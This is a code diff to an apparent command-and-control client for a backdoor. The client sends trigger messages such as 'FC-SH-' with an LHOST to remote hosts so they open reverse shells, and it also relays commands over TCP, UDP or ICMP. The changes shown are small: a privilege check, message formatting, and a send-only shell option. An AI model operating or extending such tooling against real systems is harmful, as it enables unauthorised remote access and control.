@@ -8,6 +8,7 @@ import socket
 import requests
 import multiprocessing
 import time
+import os
 
 import handle_args
 import handle_interactive
@@ -42,6 +43,10 @@ groupparams = {
 
 def main():
     print_banner()
+
+    if os.geteuid() != 0:
+        print(colored("[!] You are running without escalated privileges. This might cause errors.\n", "yellow"))
+
     handle_args.setup_args()
     handle_interactive.interactive_main()
 
@@ -103,7 +108,7 @@ def validGroupKey():
     try:
         parsedConfig[key]
     except KeyError:
-        print( colored( f"[!] GROUP {key} does not exist. Setting GROUP value back to None.\n", "red",))
+        print( colored( f"[-] GROUP {key} does not exist. Setting GROUP value back to None.\n", "red",))
         groupparams["GROUP"] = None
         return False
 
@@ -211,20 +216,20 @@ def verify(params):
     if params["TRANSPORT"] in ["TCP", "UDP", "ICMP"]: 
         passing = True
     else:
-        print( colored("[!] TRANSPORT set incorrectly. Setting TRANSPORT to TCP.\n", "red"))
+        print( colored("[-] TRANSPORT set incorrectly. Setting TRANSPORT to TCP.\n", "red"))
         params["TRANSPORT"] = "TCP"
 
     if baseparams["MODE"] != "GROUP" and params["RHOST"] is None:
-        print(colored("[!] RHOST required.\n", "red"))
+        print(colored("[-] RHOST required.\n", "red"))
         passing = False
 
     if baseparams["MODE"] == "SHELL" and params["LHOST"] is None:
-        print(colored("[!] LHOST required.\n", "red"))
+        print(colored("[-] LHOST required.\n", "red"))
         passing = False
 
     if baseparams["MODE"] == "CMD" or baseparams["MODE"] == "GROUP":
         if params["COMMAND"] is None:
-            print(colored("[!] COMMAND required.\n", "red"))
+            print(colored("[-] COMMAND required.\n", "red"))
             passing = False
 
     if baseparams["MODE"] == "GROUP" and not validGroupKey():
@@ -233,18 +238,20 @@ def verify(params):
     return passing
 
 
-def executeShell():
+def executeShell(send=False):
     if verify(shellparams):
         ip = shellparams["RHOST"]
         plaintext = "FC-SH-{}\00".format(shellparams["LHOST"])
-        t = multiprocessing.Process(target=listen, args=(shellparams,))
-        t.start() # start listener
+        if not send:
+            t = multiprocessing.Process(target=listen, args=(shellparams,))
+            t.start() # start listener
         print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
         execute(plaintext, shellparams)
-        try:
-            t.join() # wait until thread is finished
-        except KeyboardInterrupt:
-            t.terminate()
+        if not send:
+            try:
+                t.join() # wait until thread is finished
+            except KeyboardInterrupt:
+                t.terminate()
 
 def executeCmd():
     if verify(cmdparams):
@@ -271,7 +278,7 @@ def executePing():
     if baseparams["MODE"] == "CMD" and verify(cmdparams):
         plaintext = initPing(cmdparams)
         if plaintext is None:
-            print(colored("[!] Interface not set correctly.\n", "red"))
+            print(colored("[!] Interface not set correctly.\n", "yellow"))
             return
         t = multiprocessing.Process(target=pingListen)
         t.start()
@@ -284,7 +291,7 @@ def executePing():
         groupList = getGroup()
         plaintext = initPing(groupparams)
         if plaintext is None:
-            print(colored("[!] Interface not set correctly.\n", "red"))
+            print(colored("[!] Interface not set correctly.\n", "yellow"))
             return
         t = multiprocessing.Process(target=pingListen)
         t.start()
@@ -298,7 +305,7 @@ def executePing():
         t.join()
 
     else:
-        print(colored("[!] PING only works on GROUP or CMD mode.\n", "red"))
+        print(colored("[!] PING only works on GROUP or CMD mode.\n", "yellow"))
 
 def execute(plaintext, params):
     if baseparams["XOR"]:
